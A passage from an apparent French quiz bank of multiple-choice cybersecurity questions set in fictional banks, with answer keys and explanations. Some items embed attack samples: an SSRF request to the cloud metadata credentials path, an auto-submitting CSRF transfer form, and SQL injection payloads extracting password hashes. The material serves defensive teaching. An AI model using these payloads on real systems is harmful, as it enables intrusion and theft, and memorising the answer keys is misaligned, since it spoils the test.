{"url_document": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

HTTP/1.1 200 OK
Content-Type: text/plain

role-portail-prod`,
    },
    options: [
      {
        id: 'A',
        texte: 'XSS réfléchie : encoder la réponse avant de la renvoyer au navigateur',
      },
      {
        id: 'B',
        texte: "Injection de commande système : échapper les caractères spéciaux du shell",
      },
      {
        id: 'C',
        texte: 'SSRF : liste blanche des destinations, blocage des plages internes et IMDSv2',
      },
      {
        id: 'D',
        texte: "Redirection ouverte : afficher un avertissement avant de suivre un lien externe",
      },
    ],
    bonneReponse: 'C',
    explication:
      "Le serveur effectue lui-même une requête vers l'URL fournie et atteint le service de métadonnées du cloud (169.254.169.254), inaccessible depuis Internet : c'est une SSRF (A10:2021). L'étape suivante permettrait de lire des identifiants temporaires du rôle « role-portail-prod ». On restreint les destinations par liste blanche, on bloque les adresses internes et lien-local, et on impose IMDSv2 (jeton de session).",
    pourquoiPas: {
      A: "Aucun script n'est injecté dans une page : c'est le serveur qui émet la requête.",
      B: "Aucune commande shell n'est exécutée ; la donnée est utilisée comme URL par un client HTTP.",
      D: 'Une redirection ouverte renvoie le navigateur ailleurs ; ici la requête part du serveur.',
    },
    aRetenir: 'SSRF : le serveur devient le relais de l’attaquant vers le réseau interne et les métadonnées cloud.',
  },
  {
    id: 'CYB-WEB-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'moyen',
    enonce:
      "Un agent connecté au portail de virements ouvre, dans un autre onglet, la page piégée ci-dessous. Le virement est exécuté avec sa session. Quelle contre-mesure est adaptée ?",
    extrait: {
      langage: 'texte',
      contenu: `<!-- page hébergée sur http://203.0.113.50/promo.html -->
<form action="https://portail.banque-alpha.example/virements" method="POST" id="f">
  <input type="hidden" name="beneficiaire" value="ALPHA-9981-004">
  <input type="hidden" name="montant" value="250000">
</form>
<script>document.getElementById('f').submit();</script>`,
    },
    options: [
      { id: 'A', texte: 'Basculer le portail de virements en HTTPS avec un certificat EV' },
      { id: 'B', texte: 'Un jeton anti-CSRF lié à la session, et des cookies SameSite' },
      { id: 'C', texte: 'Hacher le montant côté navigateur avant la soumission du formulaire' },
      { id: 'D', texte: 'Contrôler en JavaScript le format du compte bénéficiaire' },
    ],
    bonneReponse: 'B',
    explication:
      "C'est une falsification de requête intersite (CSRF) : le navigateur joint automatiquement le cookie de session à la requête forgée. Un jeton imprévisible, lié à la session et vérifié côté serveur, ne peut pas être deviné par le site tiers. L'attribut SameSite=Lax ou Strict empêche en outre l'envoi du cookie sur ce type de requête intersite ; pour un virement, une ré-authentification forte est un plus.",
    pourquoiPas: {
      A: 'Le portail est déjà en HTTPS ; le chiffrement du transport ne bloque pas la requête forgée.',
      C: "L'attaquant contrôle entièrement le formulaire envoyé et contourne tout traitement côté client.",
      D: "Une validation en JavaScript ne s'exécute pas sur la page de l'attaquant et ne prouve rien au serveur.",
    },
    aRetenir: 'CSRF : jeton anti-CSRF vérifié côté serveur + cookies SameSite.',
  },
  {
    id: 'CYB-WEB-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'facile',
    enonce:
      "Le portail interbancaire renvoie les en-têtes de réponse ci-dessous. Quel est le rôle de l'en-tête Strict-Transport-Security ?",
    extrait: {
      langage: 'texte',
      contenu: `HTTP/1.1 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff`,
    },
    options: [
      { id: 'A', texte: "Imposer au navigateur l'usage exclusif de HTTPS pour ce domaine pendant un an" },
      { id: 'B', texte: 'Restreindre les origines depuis lesquelles des scripts peuvent être chargés' },
      { id: 'C', texte: "Interdire l'affichage du portail à l'intérieur d'une iframe tierce" },
      { id: 'D', texte: 'Empêcher le navigateur de deviner le type MIME des contenus reçus' },
    ],
    bonneReponse: 'A',
    explication:
      "HSTS indique au navigateur de n'utiliser que HTTPS pour ce domaine (et ses sous-domaines avec includeSubDomains) pendant la durée max-age, ici 31 536 000 secondes, soit un an. Il bloque ainsi les attaques de rétrogradation vers HTTP (SSL stripping). La première visite reste exposée, sauf si le domaine figure dans la liste de préchargement HSTS.",
    pourquoiPas: {
      B: "C'est le rôle de la directive default-src (ou script-src) de la Content-Security-Policy.",
      C: "C'est le rôle de frame-ancestors (ou de l'ancien en-tête X-Frame-Options).",
      D: "C'est le rôle de X-Content-Type-Options: nosniff.",
    },
    aRetenir: 'HSTS = HTTPS obligatoire côté navigateur ; CSP = sources de contenu autorisées.',
  },
  {
    id: 'CYB-WEB-007',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'moyen',
    enonce:
      "L'analyse de composition logicielle (SCA) du portail interbancaire produit le résultat ci-dessous. Dans quelle catégorie de l'OWASP Top 10 2021 classe-t-on ce constat ?",
    extrait: {
      langage: 'texte',
      contenu: `[SCA] portail-interbancaire.war
  org.apache.logging.log4j:log4j-core:2.14.1
    CVE-2021-44228  CVSS 10.0  Exécution de code à distance (JNDI lookup)
  Dernière mise à jour de la dépendance : 2021-03`,
    },
    options: [
      { id: 'A', texte: "A07 – Identification et authentification de mauvaise qualité" },
      { id: 'B', texte: 'A02 – Défaillances cryptographiques' },
      { id: 'C', texte: 'A09 – Carences de journalisation et de surveillance' },
      { id: 'D', texte: 'A06 – Composants vulnérables et obsolètes' },
    ],
    bonneReponse: 'D',
    explication:
      "Le portail embarque une version de bibliothèque affectée par une vulnérabilité publique critique (Log4Shell) : c'est un composant vulnérable et obsolète (A06:2021). La correction consiste à passer à une version corrigée (2.17.1 ou ultérieure) et à mettre en place un inventaire des dépendances (SBOM) avec une veille sur les CVE.",
    pourquoiPas: {
      A: "A07 concerne l'authentification (mots de passe faibles, sessions), pas les dépendances logicielles.",
      B: "Aucun algorithme ni aucune clé de chiffrement n'est en cause dans ce constat.",
      C: "Le composant est une bibliothèque de journalisation, mais A09 vise l'absence de journaux et d'alertes, pas une faille de code tiers.",
    },
    aRetenir: 'Dépendance avec CVE connue = A06 : inventorier (SBOM), surveiller, mettre à jour.',
  },

  // ───────────────────── IAM & contrôle d’accès ─────────────────────
  {
    id: 'CYB-IAM-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'facile',
    enonce:
      "Un agent se connecte au portail par authentification unique (SSO) avec son compte d'entreprise. Il consulte les soldes, mais reçoit « 403 Interdit » sur l'écran de validation des virements. Quelle affirmation est exacte ?",
    options: [
      { id: 'A', texte: "L'authentification a échoué, car le SSO n'a pas transmis son mot de passe à l'application." },
      { id: 'B', texte: "L'autorisation a réussi, mais l'authentification doit être renouvelée pour cet écran." },
      { id: 'C', texte: "L'authentification a réussi ; c'est l'autorisation qui lui refuse cet écran." },
      { id: 'D', texte: 'La session SSO a expiré et le portail attend une nouvelle connexion.' },
    ],
    bonneReponse: 'C',
    explication:
      "L'authentification prouve l'identité (« qui êtes-vous ? ») : elle a réussi puisque l'agent consulte les soldes. L'autorisation détermine ce que cette identité a le droit de faire : le code 403 signale un droit insuffisant pour la validation. Avec le SSO, le fournisseur d'identité authentifie, mais chaque application garde la décision d'autorisation.",
    pourquoiPas: {
      A: "Le SSO transmet une assertion signée, jamais le mot de passe ; et l'agent est bien connecté.",
      B: "On ne peut pas être autorisé sans être authentifié, et c'est l'autorisation qui est refusée ici.",
      D: 'Une absence ou une expiration de session renverrait plutôt 401 ou une redirection vers la connexion.',
    },
    aRetenir: 'Authentification = qui êtes-vous (401) ; autorisation = qu’avez-vous le droit de faire (403).',
  },
  {
    id: 'CYB-IAM-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'facile',
    enonce:
      "Laquelle des combinaisons suivantes constitue une véritable authentification multifacteur pour l'accès au système de règlement ?",
    options: [
      { id: 'A', texte: 'Un mot de passe et une question secrète' },
      { id: 'B', texte: 'Un mot de passe et une clé de sécurité FIDO2' },
      { id: 'C', texte: 'Un code PIN et un mot de passe' },
      { id: 'D', texte: 'Une empreinte digitale et une reconnaissance faciale' },
    ],
    bonneReponse: 'B',
    explication:
      "L'authentification multifacteur combine des facteurs de catégories différentes : ce que l'on sait, ce que l'on possède, ce que l'on est. Le mot de passe (savoir) associé à une clé physique FIDO2 (possession) en est un exemple. Deux éléments de la même catégorie ne font qu'un seul facteur.",
    pourquoiPas: {
      A: 'Mot de passe et question secrète relèvent tous deux du savoir.',
      C: 'Code PIN et mot de passe sont deux secrets mémorisés, donc un seul facteur.',
      D: "Deux caractéristiques biométriques relèvent toutes deux de « ce que l'on est ».",
    },
    aRetenir: 'MFA = au moins deux catégories parmi savoir, avoir, être.',
  },
  {
    id: 'CYB-IAM-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'moyen',
    enonce:
      "Les opérateurs de la salle des marchés sont ciblés par un hameçonnage en temps réel : un proxy inverse imite le portail et relaie instantanément le mot de passe et le code à usage unique saisis. Quel second facteur résiste à cette attaque ?",
    options: [
      { id: 'A', texte: "Une clé FIDO2/WebAuthn, liée cryptographiquement à l'origine du site légitime" },
      { id: 'B', texte: 'Un code à usage unique reçu par SMS sur le téléphone professionnel' },
      { id: 'C', texte: 'Un code TOTP à six chiffres généré par une application mobile' },
      { id: 'D', texte: "Une notification push à approuver d'un simple appui sur le téléphone professionnel enrôlé" },
    ],
    bonneReponse: 'A',
    explication:
      "Avec WebAuthn, le navigateur inclut l'origine réelle du site dans la réponse signée par la clé : une signature produite sur le domaine du proxy ne sera pas valide pour le portail légitime. Les codes SMS ou TOTP, eux, peuvent être saisis sur le faux site puis rejoués immédiatement par l'attaquant. FIDO2 est ainsi qualifié de facteur résistant à l'hameçonnage ; le NIST SP 800-63B classe d'ailleurs le SMS parmi les authentificateurs à usage restreint.",
    pourquoiPas: {
      B: "Le code SMS est saisi sur la fausse page et relayé en temps réel ; il est aussi exposé au SIM swapping.",
      C: "Un TOTP valable 30 secondes laisse largement le temps au proxy de le rejouer.",
      D: "L'utilisateur approuve la connexion initiée par l'attaquant, sans lien avec le site visité.",
    },
    aRetenir: 'Seule une authentification liée à l’origine (FIDO2/WebAuthn) résiste au phishing en temps réel.',
  },
  {
    id: 'CYB-IAM-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'moyen',
    enonce:
      "La revue des journaux de l'application de paiements de gros montant fait apparaître la séquence ci-dessous. Quel principe de contrôle d'accès n'est pas respecté ?",
    extrait: {
      langage: 'log',
      contenu: `2026-03-14 09:41:02 PAY-7781 SAISIE      utilisateur=agent042  montant=1 200 000 000  benef=BANQUE-GAMMA
2026-03-14 09:43:57 PAY-7781 VALIDATION  utilisateur=agent042  statut=APPROUVE
2026-03-14 09:44:10 PAY-7781 EMISSION    systeme=passerelle-rtgs  statut=ENVOYE`,
    },
    options: [
      { id: 'A', texte: "Le besoin d'en connaître, car l'agent voit le nom de la banque bénéficiaire" },
      { id: 'B', texte: 'La non-répudiation, car le journal ne contient aucune signature électronique' },
      { id: 'C', texte: "L'authentification forte, car l'agent a pu se connecter à l'application" },
      { id: 'D', texte: 'La séparation des tâches, car un même agent a saisi puis validé le paiement' },
    ],
    bonneReponse: 'D',
    explication:
      "Pour un paiement sensible, la saisie et la validation doivent être réalisées par deux personnes distinctes (principe des « quatre yeux »). Ici, agent042 a saisi et validé le même ordre, qui a été émis sans contrôle indépendant. L'application doit bloquer techniquement la validation par l'auteur de la saisie, et les profils ne doivent pas cumuler ces deux rôles.",
    pourquoiPas: {
      A: "Voir le bénéficiaire est nécessaire à l'agent qui saisit le paiement.",
      B: "Le journal attribue bien chaque action à un utilisateur ; l'anomalie est le cumul des rôles.",
      C: "Rien n'indique une faiblesse de l'authentification ; c'est la règle d'autorisation qui manque.",
    },
    aRetenir: 'Séparation des tâches : celui qui saisit ne valide pas, et le système doit l’imposer.',
  },
  {
    id: 'CYB-IAM-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'moyen',
    enonce:
      "La politique de la Banque Alpha prévoit qu'un agent du back-office ne valide un virement que si le montant est inférieur à son plafond individuel, pendant les heures ouvrées et depuis un poste du réseau interne. Quel modèle de contrôle d'accès exprime naturellement cette règle ?",
    options: [
      { id: 'A', texte: "RBAC pur, fondé uniquement sur le rôle attribué à l'agent" },
      { id: 'B', texte: 'DAC, où le propriétaire de chaque ressource accorde les droits' },
      { id: 'C', texte: 'ABAC, fondé sur des attributs du sujet, de la ressource et du contexte' },
      { id: 'D', texte: 'MAC, fondé sur des niveaux de classification des données et d’habilitation des agents' },
    ],
    bonneReponse: 'C',
    explication:
      "La décision dépend d'attributs du sujet (plafond de l'agent), de la ressource (montant du virement) et du contexte (heure, localisation réseau) : c'est la définition de l'ABAC. Le RBAC attribue des permissions statiques à des rôles et peine à exprimer ce genre de conditions sans multiplier les rôles. En pratique, on combine souvent les deux : le rôle donne l'accès de base, les attributs l'affinent.",
    pourquoiPas: {
      A: "Le rôle seul ne tient compte ni du montant, ni de l'heure, ni de la provenance réseau.",
      B: 'En DAC, le propriétaire distribue les droits à sa discrétion, sans règles contextuelles centralisées.',
      D: "Le MAC compare niveaux de classification et d'habilitation, pas des plafonds ou des horaires.",
    },
    aRetenir: 'Règle dépendant du contexte (heure, lieu, montant) = ABAC ; rôle seul = RBAC.',
  },
  {
    id: 'CYB-IAM-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'difficile',
    enonce:
      "Sur les serveurs du système de règlement brut en temps réel, cinq administrateurs partagent le compte « root », dont le mot de passe n'a pas changé depuis deux ans. Quelle mesure répond le mieux au risque ?",
    options: [
      {
        id: 'A',
        texte: 'Changer le mot de passe root chaque mois et le communiquer aux cinq administrateurs par courriel chiffré.',
      },
      {
        id: 'B',
        texte: 'Mettre en place un PAM : coffre avec rotation, accès nominatif à la demande et enregistrement des sessions.',
      },
      {
        id: 'C',
        texte: 'Créer cinq comptes nominatifs disposant en permanence de « sudo ALL », sans journalisation particulière.',
      },
      {
        id: 'D',
        texte: "Activer l'authentification multifacteur sur le compte root partagé, utilisé tel quel par les cinq.",
      },
    ],
    bonneReponse: 'B',
    explication:
      "Un compte partagé interdit d'imputer une action à une personne, et un secret figé depuis deux ans a pu fuiter. Une solution de gestion des accès à privilèges (PAM) conserve le secret dans un coffre avec rotation automatique, accorde l'accès de façon nominative et temporaire après approbation, et enregistre les sessions. On obtient à la fois le moindre privilège dans le temps et une traçabilité complète.",
    pourquoiPas: {
      A: 'Le compte reste partagé et non imputable, et le secret circule toujours entre cinq personnes.',
      C: 'Des droits illimités et permanents sans traces violent le moindre privilège et la traçabilité.',
      D: "La MFA durcit la connexion mais le compte reste partagé : impossible de savoir qui a agi.",
    },
    aRetenir: 'Comptes à privilèges : coffre PAM, accès nominatif juste-à-temps, sessions enregistrées.',
  },
  {
    id: 'CYB-IAM-007',
    section: 'technique',
    filiere: 'cyber',
    competence: 'IAM & contrôle d’accès',
    difficulte: 'moyen',
    enonce:
      "Lors d'une enquête, vous rapprochez les événements ci-dessous, issus du SIRH, du VPN et du portail de paiements. Quelle défaillance de gestion des identités est principalement en cause ?",
    extrait: {
      langage: 'log',
      contenu: `2026-02-27  SIRH     Fin de contrat : agent.d17 (Direction des paiements), dernier jour 28/02/2026
2026-03-09  VPN      Connexion réussie       utilisateur=agent.d17  ip=198.51.100.23
2026-03-09  PORTAIL  Export liste_beneficiaires.csv  utilisateur=agent.d17  lignes=4812`,
    },
    options: [
      { id: 'A', texte: 'Un processus de départ défaillant : les accès n’ont pas été désactivés à la fin du contrat' },
      { id: 'B', texte: 'Un chiffrement insuffisant du tunnel VPN, qui aurait permis à un tiers de détourner la session de l’agent' },
      { id: 'C', texte: "L'absence de chiffrement du fichier CSV exporté depuis le portail de paiements" },
      { id: 'D', texte: "Une politique de mots de passe trop permissive sur l'annuaire de l'entreprise" },
    ],
    bonneReponse: 'A',
    explication:
      "Neuf jours après son départ, l'ancien agent dispose encore d'un compte actif, d'un accès VPN et de droits d'export. Le processus de départ (« leaver ») doit déclencher, dès l'information RH, la désactivation de tous les comptes, jetons et accès distants. Des revues périodiques des habilitations permettent de détecter les comptes orphelins qui auraient échappé à ce processus.",
    pourquoiPas: {
      B: "Le tunnel chiffré n'est pas en cause : c'est un utilisateur qui n'aurait plus dû être autorisé qui s'y est connecté.",
      C: "Chiffrer l'export n'aurait rien changé : l'utilisateur légitime du compte aurait pu le lire.",
      D: "Le mot de passe de l'agent était valide ; le problème est que son compte n'aurait plus dû exister.",
    },
    aRetenir: 'Départ d’un agent = désactivation immédiate de tous ses accès, contrôlée par la revue des habilitations.',
  },
];

const banqueCyberB: QcmQuestion[] = [
  // ───────────────────────── SIEM & analyse de logs ─────────────────────────
  {
    id: 'CYB-LOG-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'SIEM & analyse de logs',
    difficulte: 'facile',
    enonce:
      "Le SIEM remonte l'extrait suivant du journal d'authentification d'un serveur Linux du switch monétique de Banque Beta. Quelle attaque est la plus probable ?",
    extrait: {
      langage: 'log',
      contenu: `Mar 14 02:13:01 sw-monetique-01 sshd[21877]: Failed password for root from 203.0.113.45 port 51122 ssh2
Mar 14 02:13:02 sw-monetique-01 sshd[21879]: Failed password for root from 203.0.113.45 port 51130 ssh2
Mar 14 02:13:03 sw-monetique-01 sshd[21881]: Failed password for root from 203.0.113.45 port 51141 ssh2
Mar 14 02:13:04 sw-monetique-01 sshd[21884]: Failed password for root from 203.0.113.45 port 51156 ssh2
Mar 14 02:13:05 sw-monetique-01 sshd[21887]: Failed password for root from 203.0.113.45 port 51170 ssh2
[... 1 842 lignes similaires entre 02:13 et 02:28 ...]`,
    },
    options: [
      { id: 'A', texte: 'Une attaque par force brute ciblant le compte root depuis une source unique' },
      { id: 'B', texte: "Une pulvérisation de mots de passe (password spraying) sur de nombreux comptes" },
      { id: 'C', texte: "Une attaque par déni de service volumétrique visant le port SSH" },
      { id: 'D', texte: "Une tentative de rejeu de jetons Kerberos sur le serveur Linux" },
    ],
    bonneReponse: 'A',
    explication:
      "Une même IP essaie en boucle, à raison d'une tentative par seconde, des mots de passe différents sur un seul compte (root) : c'est la signature d'une force brute. La réponse attendue consiste à bloquer la source, interdire la connexion directe de root (PermitRootLogin no) et imposer l'authentification par clé.",
    pourquoiPas: {
      B: "Le password spraying teste un mot de passe sur de nombreux comptes, alors qu'ici un seul compte est visé.",
      C: "Un DDoS volumétrique cherche à saturer la bande passante depuis de multiples sources, pas à deviner un mot de passe depuis une IP unique.",
      D: "Kerberos est un protocole d'authentification Active Directory ; les lignes sshd « Failed password » ne concernent pas des tickets Kerberos.",
    },
    aRetenir: "Un compte, une source, des milliers d'essais rapides : force brute.",
  },
  {
    id: 'CYB-LOG-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'SIEM & analyse de logs',
    difficulte: 'moyen',
    enonce:
      "Sur le contrôleur de domaine de Banque Alpha, l'analyste observe la série d'événements ci-dessous (tous les comptes existent et aucun n'est verrouillé). Quel type d'attaque est en cours ?",
    extrait: {
      langage: 'log',
      contenu: `2026-03-10T07:58:01Z EventID=4625 TargetUserName=agent.tresor01 IpAddress=10.12.4.77 LogonType=3 SubStatus=0xC000006A
2026-03-10T07:59:02Z EventID=4625 TargetUserName=agent.compta07 IpAddress=10.12.4.77 LogonType=3 SubStatus=0xC000006A
2026-03-10T08:00:04Z EventID=4625 TargetUserName=agent.change03 IpAddress=10.12.4.77 LogonType=3 SubStatus=0xC000006A
2026-03-10T08:01:03Z EventID=4625 TargetUserName=agent.rh12     IpAddress=10.12.4.77 LogonType=3 SubStatus=0xC000006A
[... 312 comptes distincts, une seule tentative par compte, environ une par minute ...]`,
    },
    options: [
      { id: 'A', texte: 'Une force brute classique sur un compte administrateur unique' },
      { id: 'B', texte: "Un cassage hors ligne de condensats de mots de passe volés" },
      { id: 'C', texte: "Une pulvérisation de mots de passe (password spraying) lente et répartie" },
      { id: 'D', texte: "Une attaque de type Kerberoasting sur des comptes de service" },
    ],
    bonneReponse: 'C',
    explication:
      "Une seule source teste un mot de passe (SubStatus 0xC000006A = mot de passe erroné) sur des centaines de comptes différents, à raison d'un essai par compte et d'un rythme lent. Ce schéma vise à rester sous le seuil de verrouillage : c'est du password spraying. La règle SIEM pertinente corrèle le nombre de comptes distincts en échec par source sur une fenêtre de temps.",
    pourquoiPas: {
      A: "Une force brute concentrerait de nombreux essais sur un même compte, alors qu'ici chaque compte n'est tenté qu'une fois.",
      B: "Un cassage hors ligne s'effectue sur la machine de l'attaquant et ne génère aucun événement 4625 sur le contrôleur de domaine.",
      D: "Le Kerberoasting se traduit par des demandes de tickets de service (événement 4769), pas par des échecs d'ouverture de session 4625.",
    },
    aRetenir: "Un mot de passe, beaucoup de comptes, un rythme lent : password spraying.",
  },
  {
    id: 'CYB-LOG-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'SIEM & analyse de logs',
    difficulte: 'difficile',
    enonce:
      "Un serveur d'administration du système de compensation de Banque Gamma, exposé par erreur en RDP, produit les événements suivants. Quelle interprétation est la plus juste ?",
    extrait: {
      langage: 'log',
      contenu: `02:41:10 EventID=4625 TargetUserName=adm.switch LogonType=10 IpAddress=198.51.100.23
02:41:16 EventID=4625 TargetUserName=adm.switch LogonType=10 IpAddress=198.51.100.23
[... 37 échecs identiques entre 02:41 et 02:45 ...]
02:45:02 EventID=4624 TargetUserName=adm.switch LogonType=10 IpAddress=198.51.100.23
02:45:02 EventID=4672 SubjectUserName=adm.switch PrivilegeList=SeDebugPrivilege SeBackupPrivilege SeTakeOwnershipPrivilege`,
    },
    options: [
      { id: 'A', texte: "L'événement 4672 indique la fermeture de session : l'attaquant a abandonné" },
      { id: 'B', texte: "LogonType 10 désigne un simple accès à un partage réseau, sans gravité particulière" },
      { id: 'C', texte: "Un utilisateur légitime s'est trompé plusieurs fois avant de réussir : aucune action requise" },
      { id: 'D', texte: "Une force brute RDP a abouti : session interactive distante ouverte avec des privilèges élevés" },
    ],
    bonneReponse: 'D',
    explication:
      "Les 4625 répétés suivis d'un 4624 de type 10 (RemoteInteractive, c'est-à-dire RDP) depuis la même IP externe montrent que la force brute a réussi. Le 4672 qui suit signifie que des privilèges spéciaux (SeDebugPrivilege, etc.) ont été attribués à cette session : le compte compromis est privilégié. C'est un incident critique qui impose isolement du serveur, désactivation du compte et investigation.",
    pourquoiPas: {
      A: "La fermeture de session correspond à l'événement 4634 (ou 4647) ; le 4672 signale l'attribution de privilèges spéciaux à une nouvelle ouverture de session.",
      B: "L'accès réseau à un partage est le LogonType 3 ; le type 10 correspond à une session interactive à distance (RDP).",
      C: "Trente-sept échecs en quatre minutes depuis une IP externe, à 2 h du matin, suivis d'un succès privilégié, ne relèvent pas d'une faute de frappe.",
    },
    aRetenir: "4625 en rafale puis 4624 type 10 et 4672 : RDP compromis avec un compte privilégié.",
  },
  {
    id: 'CYB-LOG-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'SIEM & analyse de logs',
    difficulte: 'facile',
    enonce:
      "En reconstituant une même session suspecte sur le portail de virements de Banque Alpha, l'analyste obtient la chronologie ci-dessous, qui est incohérente (la connexion AD apparaît avant le passage du pare-feu). Quelle est la cause la plus probable et la correction adaptée ?",
    extrait: {
      langage: 'texte',
      contenu: `[FW-DMZ]  2026-05-02 14:03:12  ALLOW 203.0.113.80 -> 10.1.2.15:443
[WEB-01]  2026-05-02 14:09:47  POST /api/virements 200 src=203.0.113.80
[DC-02]   2026-05-02 13:58:30  EventID=4624 TargetUserName=svc.portail`,
    },
    options: [
      { id: 'A', texte: "Le SIEM manque de licences d'ingestion : il faut augmenter son volume autorisé" },
      { id: 'B', texte: "Les horloges ne sont pas synchronisées : il faut imposer NTP sur une source de référence commune" },
      { id: 'C', texte: "Les équipements sont dans des fuseaux horaires différents : il suffit d'ajouter une heure" },
      { id: 'D', texte: "L'attaquant a forcément falsifié les journaux : il faut reconstruire tous les serveurs" },
    ],
    bonneReponse: 'B',
    explication:
      "Des écarts de quelques minutes, non multiples d'une heure, trahissent une dérive d'horloge entre équipements. Sans synchronisation NTP sur une source de temps de référence commune (et un horodatage en UTC), la corrélation d'événements par le SIEM devient peu fiable et la valeur probante des journaux est affaiblie.",
    pourquoiPas: {
      A: "Un manque de licence provoque des pertes ou des retards d'ingestion, pas des horodatages décalés à la source.",
      C: "Un problème de fuseau horaire produirait des écarts d'heures entières, alors qu'ici les décalages sont de quelques minutes.",
      D: "La falsification est une hypothèse à ne pas exclure, mais elle n'est pas la plus probable et ne justifie pas de reconstruire tout le parc avant d'avoir vérifié la synchronisation.",
    },
    aRetenir: "Pas de corrélation fiable sans horloges synchronisées par NTP, idéalement en UTC.",
  },
  {
    id: 'CYB-LOG-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'SIEM & analyse de logs',
    difficulte: 'moyen',
    enonce:
      "Voici un extrait du journal d'accès Apache du service de consultation des relevés d'une banque fictive (Banque Delta). Quelle conclusion doit être retenue en priorité ?",
    extrait: {
      langage: 'log',
      contenu: `203.0.113.9 - - [12/Jun/2026:10:14:02 +0100] "GET /releves?compte=1001%27 HTTP/1.1" 500 612 "-" "sqlmap/1.7"
203.0.113.9 - - [12/Jun/2026:10:14:05 +0100] "GET /releves?compte=1001%20AND%201=1 HTTP/1.1" 200 4210 "-" "sqlmap/1.7"
203.0.113.9 - - [12/Jun/2026:10:14:06 +0100] "GET /releves?compte=1001%20AND%201=2 HTTP/1.1" 200 380 "-" "sqlmap/1.7"
203.0.113.9 - - [12/Jun/2026:10:15:40 +0100] "GET /releves?compte=1001%20UNION%20SELECT%20login,hash%20FROM%20utilisateurs-- HTTP/1.1" 200 48211 "-" "sqlmap/1.7"
198.51.100.4 - - [12/Jun/2026:10:16:12 +0100] "GET /releves?compte=2002 HTTP/1.1" 200 4150 "-" "Mozilla/5.0"`,
    },
    options: [
      { id: 'A', texte: "L'injection SQL a probablement réussi : la requête UNION renvoie 200 avec une réponse volumineuse" },
      { id: 'B', texte: "L'erreur 500 de la première ligne prouve que l'application a bloqué l'attaque" },
      { id: 'C', texte: "L'adresse 198.51.100.4 est la source principale de l'attaque et doit être bloquée" },
      { id: 'D', texte: "Le user-agent sqlmap prouve qu'il s'agit d'un test d'intrusion autorisé" },
    ],
    bonneReponse: 'A',
    explication:
      "Les réponses différentes pour « AND 1=1 » (4 210 octets) et « AND 1=2 » (380 octets) montrent que le paramètre est injectable. La requête UNION SELECT sur la table des utilisateurs renvoie ensuite un code 200 avec 48 Ko, signe probable d'une extraction de données. Il faut traiter l'événement comme un incident avéré : bloquer la source, préserver les journaux et évaluer les données exposées.",
    pourquoiPas: {
      B: "L'erreur 500 sur l'apostrophe révèle au contraire une requête SQL mal protégée, ce qui confirme la vulnérabilité.",
      C: "Cette adresse effectue une consultation normale avec un navigateur standard ; l'attaque provient de 203.0.113.9.",
      D: "Le user-agent est librement falsifiable ; seul un mandat de test documenté et planifié permettrait de conclure à un test autorisé.",
    },
    aRetenir: "Réponses différentielles puis UNION en 200 volumineux : injection SQL réussie jusqu'à preuve du contraire.",
  },
  {
    id: 'CYB-LOG-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'SIEM & analyse de logs',
    difficulte: 'moyen',
    enonce:
      "Chaque mardi vers 2 h, le SIEM de Banque Beta lève l'alerte ci-dessous. L'adresse 10.0.8.5 est le scanner de vulnérabilités officiel, dont la plage d'exécution (mardi 02h-04h) figure dans un ticket de changement approuvé. Quelle est la meilleure gestion de cette alerte ?",
    extrait: {
      langage: 'log',
      contenu: `2026-04-07 02:00:14 DENY TCP 10.0.8.5:40112 -> 10.30.1.10:23
2026-04-07 02:00:14 DENY TCP 10.0.8.5:40113 -> 10.30.1.10:3389
2026-04-07 02:00:15 DENY TCP 10.0.8.5:40114 -> 10.30.1.10:5900
SIEM ALERTE [Scan de ports interne] src=10.0.8.5 dst=10.30.1.0/24 ports=1912 durée=90s sévérité=Haute`,
    },
    options: [
      { id: 'A', texte: "Désactiver définitivement la règle de détection des scans de ports internes" },
      { id: 'B', texte: "Exclure tout le sous-réseau 10.0.8.0/24 de l'ensemble des règles du SIEM" },
      { id: 'C', texte: "Déclarer un incident critique et isoler immédiatement le scanner du réseau" },
      { id: 'D', texte: "Qualifier l'alerte comme bénigne et créer une exception limitée à cette source et à ce créneau" },
    ],
    bonneReponse: 'D',
    explication:
      "L'activité est légitime, attendue et documentée : l'alerte doit être qualifiée comme faux positif (positif bénin) puis la règle affinée. L'exception doit rester étroite (IP du scanner et créneau autorisé) et être tracée, afin que la règle continue de détecter un scan venant de toute autre source ou hors fenêtre.",
    pourquoiPas: {
      A: "Désactiver la règle supprimerait la détection d'un vrai scan mené par un attaquant ayant pris pied dans le réseau.",
      B: "Une exclusion globale d'un sous-réseau sur toutes les règles crée un angle mort qu'un attaquant pourrait exploiter.",
      C: "L'activité correspond exactement au changement approuvé ; isoler le scanner relève d'une sur-réaction qui désorganise la gestion des vulnérabilités.",
    },
    aRetenir: "On réduit les faux positifs par des exceptions étroites et documentées, jamais en éteignant la détection.",
  },

  // ───────────────────────────────── Menaces ─────────────────────────────────
  {
    id: 'CYB-MEN-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'facile',
    enonce:
      "Le switch monétique de Banque Beta reçoit un afflux massif de paquets TCP SYN jamais suivis d'un ACK. La table des connexions semi-ouvertes du pare-feu est saturée alors que la bande passante n'est utilisée qu'à 30 %. De quelle catégorie de DDoS s'agit-il ?",
    options: [
